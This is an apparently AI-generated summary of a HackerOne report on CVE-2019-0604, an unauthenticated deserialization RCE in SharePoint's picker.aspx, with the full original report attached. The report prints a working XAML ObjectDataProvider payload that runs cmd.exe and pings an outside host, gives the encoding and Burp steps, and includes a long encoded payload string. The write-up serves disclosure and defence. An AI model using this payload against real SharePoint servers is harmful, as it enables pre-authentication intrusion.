# Remote Code Execution via Unauthenticated Unsafe Deserialization (CVE-2019-0604)

## Metadata
- **Source:** HackerOne
- **Report:** 534630 | https://hackerone.com/reports/534630
- **Submitted:** 2019-04-10
- **Reporter:** l00ph0le
- **Program:** Microsoft (via HackerOne)
- **Bounty:** Not specified in report
- **Severity:** critical
- **Vuln:** Unsafe Deserialization, Remote Code Execution, Command Injection, Unauthenticated Access
- **CVEs:** CVE-2019-0604
- **Category:** memory-binary

## Summary
Microsoft SharePoint versions prior to the March 2019 patch contain a critical vulnerability (CVE-2019-0604) in the picker.aspx endpoint that unsafely deserializes untrusted XAML data. An unauthenticated attacker can craft a malicious encoded XAML payload and inject it via the hiddenSpanData parameter to achieve arbitrary command execution with the privileges of the SharePoint application pool account.

## Attack scenario
1. Attacker identifies target SharePoint instance running vulnerable version (before March 2019 patch)
2. Attacker crafts malicious XAML payload containing ObjectDataProvider that invokes Process.Start() with arbitrary Windows commands
3. Attacker encodes the XAML payload using the provided ConsoleApplication1.exe encoder to obfuscate it
4. Attacker uses HTTP interception proxy to intercept request to picker.aspx endpoint
5. Attacker modifies the hiddenSpanData parameter with the encoded payload in the HTTP request
6. SharePoint server deserializes the malicious XAML without validation, triggering Process.Start() execution on the server

## Root cause
SharePoint's picker.aspx endpoint deserializes untrusted user-supplied data (XAML) without proper validation or sandboxing. The ObjectDataProvider XAML class allows instantiation and method invocation of arbitrary .NET types, specifically System.Diagnostics.Process.Start(), enabling command execution during deserialization.

## Attacker mindset
An attacker exploiting this vulnerability seeks pre-authentication remote code execution to establish initial access to corporate networks. The ability to execute arbitrary Windows commands with application pool privileges enables lateral movement, data exfiltration, and persistence establishment. The public availability of PoC code significantly lowers the barrier to exploitation.

## Defensive takeaways
- Apply March 2019 or later patches immediately to all SharePoint instances - this is a pre-auth RCE with CVSS 9.8
- Implement network segmentation to restrict access to SharePoint administrative endpoints (picker.aspx, _layouts paths)
- Monitor HTTP requests to SharePoint picker endpoints for suspicious encoded parameters, particularly hiddenSpanData values
- Disable XAML deserialization where possible or implement strict type whitelisting for deserialized objects
- Use Web Application Firewalls (WAF) with rules to detect and block encoded XAML payloads and ObjectDataProvider instantiation attempts
- Implement input validation rejecting user-supplied XAML or serialized .NET objects in web parameters
- Monitor SharePoint application pool process creation for unexpected cmd.exe or powershell.exe spawning
- Audit SharePoint access logs for requests to _layouts/15/picker.aspx from unexpected sources

## Variant hunting
Search for other SharePoint endpoints accepting serialized or XAML data (especially _layouts paths). Investigate other ObjectDataProvider usages in SharePoint components. Test XML/XAML deserialization in other Microsoft web products (Exchange, Office Web Apps). Look for similar unsafe deserialization in third-party SharePoint extensions or custom controls that might mirror this pattern.

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application
- T1059 - Command and Scripting Interpreter
- T1203 - Exploitation for Client Execution
- T1648 - Serverless Execution
- T1547 - Boot or Logon Autostart Execution (if used for persistence)
- T1021 - Remote Services (for lateral movement post-exploitation)

## Notes
CVE-2019-0604 was a critical vulnerability affecting SharePoint 2013, 2016, and 2019. The public PoC availability and ease of exploitation (minimal steps required) led to widespread exploitation in the wild. The vulnerability required no authentication, making it extremely dangerous. Organizations were urged to patch immediately upon disclosure. The encoding/obfuscation step suggests SharePoint may have had some basic filtering that was bypassed through encoding rather than as a security feature.

## Full report
<details><summary>Expand</summary>

**Summary:**
Microsoft recently released a patch for CVE-2019-0604. This vulnerability is caused by the Microsoft SharePoint application deserializing untrusted data from a user.

This means an attacker can send a specially crafted/encoded parameter to a Microsoft SharePoint URL, and it will allow Remote Code Execution or Command Injection on the server.

This is an in-depth blog post about the vulnerability.
https://www.thezdi.com/blog/2019/3/13/cve-2019-0604-details-of-a-microsoft-sharepoint-rce-vulnerability

The ████ SharePoint site suffers from this vulnerability. The URL for the main site is: https://████/███████/OrgStruct/StandingGroups/Pages/default.aspx 

**Description:**

## Impact
The impact is high. Using the steps below an attacker can run any windows command line on the SharePoint server.

## Step-by-step Reproduction Instructions

1. Clone this github repository for the PoC code https://github.com/l00ph0le/CVE-2019-0604.git
2. Edit the second "<System:String>/c calc</System:String>" in t.xml to the command you would like to execute on the windows server. I edited mind to send a ping request to a ubuntu server hosted on the Internet. The final file looks like this:

<ResourceDictionary
xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
xmlns:System="clr-namespace:System;assembly=mscorlib"
xmlns:Diag="clr-namespace:System.Diagnostics;assembly=system">
	<ObjectDataProvider x:Key="LaunchCalch" ObjectType="{x:Type Diag:Process}" MethodName="Start">
		<ObjectDataProvider.MethodParameters>
			<System:String>cmd.exe</System:String>
			<System:String>/c ping cloudbox2.legithost.info</System:String>
		</ObjectDataProvider.MethodParameters>
	</ObjectDataProvider>
</ResourceDictionary>

3. User "ConsoleApplication1.exe" to generate the encoded payload like this:
c:/>cd c:\CVE-2019-0604\ConsoleApplication1\ConsoleApplication1\bin\Debug\

c:/CVE-2019-0604\ConsoleApplication1\ConsoleApplication1\bin\Debug\>ConsoleApplication1.exe c:/CVE-2019-0604/t.xml

4. This will produce an encoded string that begins with "__", copy this string.

5. Setup an Interception proxy (BurpSuite). 

6. Browse to the vulnerable URL:
https://████/████/OrgStruct/StandingGroups/_layouts/15/picker.aspx?PickerDialogType=Microsoft.SharePoint.WebControls.ItemPickerDialog,%20Microsoft.SharePoint,%20Version=15.0.0.0,%20Culture=neutral,%20PublicKeyToken=71e9bce111e9429c

7. When the "Picker.aspx" page loads, click the hour glass in the right hand corner, and stop the request with burp suite. In the request look for the parameter "ctl00%24PlaceHolderDialogBodySection%24ctl05%24hiddenSpanData=", and set the value to the encoded string you generated with ConsoleAPplication1.exe. Leave the request paused. The string will look something like this:

__bp4b7135009700370047005600d600e2004400160047001600e20035005600270067009600360056003700e2009400e600470056002700e6001600c600e2005400870007001600e600460056004600750027001600070007005600270006002300b500b50035009700370047005600d600e20075009600e6004600f60077003700e200d40016002700b60057000700e20085001600d600c600250056001600460056002700c200020005002700560037005600e6004700160047009600f600e600640027001600d60056007700f6002700b600c200020065005600270037009600f600e600d3004300e2000300e2000300e2000300c200020034005700c6004700570027005600d300e60056005700470027001600c600c2000200050057002600c60096003600b400560097004500f600b6005600e600d3003300130026006600330083005300630016004600330063004300560033005300d500c200b50035009700370047005600d600e20075009600e6004600f60077003700e2004400160047001600e200f4002600a600560036004700440016004700160005002700f60067009600460056002700c200020005002700560037005600e6004700160047009600f600e600640027001600d60056007700f6002700b600c200020065005600270037009600f600e600d3004300e2000300e2000300e2000300c200020034005700c6004700570027005600d300e60056005700470027001600c600c2000200050057002600c60096003600b400560097004500f600b6005600e600d3003300130026006600330083005300630016004600330063004300560033005300d500d500c200020035009700370047005600d600e2004400160047001600e20035005600270067009600360056003700c200020065005600270037009600f600e600d3004300e2000300e2000300e2000300c200020034005700c6004700570027005600d300e60056005700470027001600c600c2000200050057002600c60096003600b400560097004500f600b6005600e600d3002600730073001600530036005300630013009300330043005600030083009300a300c300f3008700d600c600020067005600270037009600f600e600d30022001300e2000300220002005600e6003600f60046009600e6007600d3002200570047006600d200130063002200f300e300d000a000c3005400870007001600e6004600560046007500270016000700070056002700f400660085001600d600c600250056001600460056002700f4002600a600560036004700440016004700160005002700f6006700960046005600270002008700d600c600e6003700a300870037009600d30022008600470047000700a300f200f200770077007700e20077003300e200f60027007600f2002300030003001300f2008500d400c4003500360086005600d6001600d2009600e600370047001600e60036005600220002008700d600c600e6003700a300870037004600d30022008600470047000700a300f200f200770077007700e20077003300e200f60027007600f2002300030003001300f2008500d400c4003500360086005600d60016002200e300d000a00002000200c30005002700f600a6005600360047005600460005002700f600070056002700470097000300e300d000a0000200020002000200c300f4002600a6005600360047009400e600370047001600e600360056000200870037009600a3004700970007005600d300220085001600d600c60025005600160046005600270022000200f200e300d000a0000200020002000200c300d400560047008600f6004600e4001600d6005600e30005001600270037005600c300f200d400560047008600f6004600e4001600d6005600e300d000a0000200020002000200c300d400560047008600f60046000500160027001600d60056004700560027003700e300d000a000020002000200020002000200c3001600e600970045009700070056000200870037009600a3004700970007005600d3002200870037004600a3003700470027009600e60076002200e3006200c6004700b300250056003700f600570027003600560044009600360047009600f600e600160027009700d000a0008700d600c600e6003700d30022008600470047000700a300f200f2003700360086005600d60016003700e200d600960036002700f6003700f60066004700e2003600f600d600f20077009600e60066008700f2002300030003006300f20087001600d600c600f20007002700560037005600e6004700160047009600f600e6002200d000a0008700d600c600e6003700a3008700d30022008600470047000700a300f200f2003700360086005600d60016003700e200d600960036002700f6003700f60066004700e2003600f600d600f20077009600e60066008700f2002300030003006300f20087001600d600c6002200d000a0008700d600c600e6003700a30035009700370047005600d600d30022003600c6002700d200e6001600d600560037000700160036005600a30035009700370047005600d600b3001600370037005600d6002600c6009700d300d60037003600f6002700c600960026002200d000a0008700d600c600e6003700a3004400960016007600d30022003600c6002700d200e6001600d600560037000700160036005600a30035009700370047005600d600e2004400960016007600e600f60037004700960036003700b3001600370037005600d6002600c6009700d30037009700370047005600d6002200620076004700b300d000a00090006200c6004700b300f4002600a600560036004700440016004700160005002700f6006700960046005600270002008700a300b40056009700d3002200c40016005700e600360086003400d600460022000200f4002600a6005600360047004500970007005600d3002200b7008700a300450097000700560002004400960016007600a30005002700f6003600560037003700d70022000200d400560047008600f6004600e4001600d6005600d3002200350047001600270047002200620076004700b300d000a000900090006200c6004700b300f4002600a600560036004700440016004700160005002700f60067009600460056002700e200d400560047008600f60046000500160027001600d60056004700560027003700620076004700b300d000a0009000900090006200c6004700b30035009700370047005600d600a3003500470027009600e6007600620076004700b3003600d6004600e2005600870056006200c6004700b300f20035009700370047005600d600a3003500470027009600e6007600620076004700b300d000a0009000900090006200c6004700b30035009700370047005600d600a3003500470027009600e6007600620076004700b300f2003600020007009600e600760002003600c600f600570046002600f60087002300e200c60056007600960047008600f60037004700e2009600e6006600f6006200c6004700b300f20035009700370047005600d600a3003

</details>

---
*Analysed by Claude on 2026-05-12*
